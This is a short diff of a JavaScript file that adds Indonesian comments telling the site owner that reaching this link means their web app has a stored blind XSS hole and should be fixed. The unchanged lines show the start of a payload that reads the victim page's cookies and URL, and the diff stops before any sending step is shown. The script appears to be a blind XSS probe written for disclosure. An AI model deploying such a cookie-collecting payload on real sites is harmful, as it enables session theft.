@@ -1,3 +1,8 @@
+// halooooo, kalau anda di arahkan ke link berikut, berarti ada celah kemanan blind xss stored dalam web anda
+// mwehehehehehe
+// perbaiki yak webnya,
+// stay secure
+
 (async () => {
       const cookies = document.cookie || "Tidak ada cookie";
       const url = window.location.href;
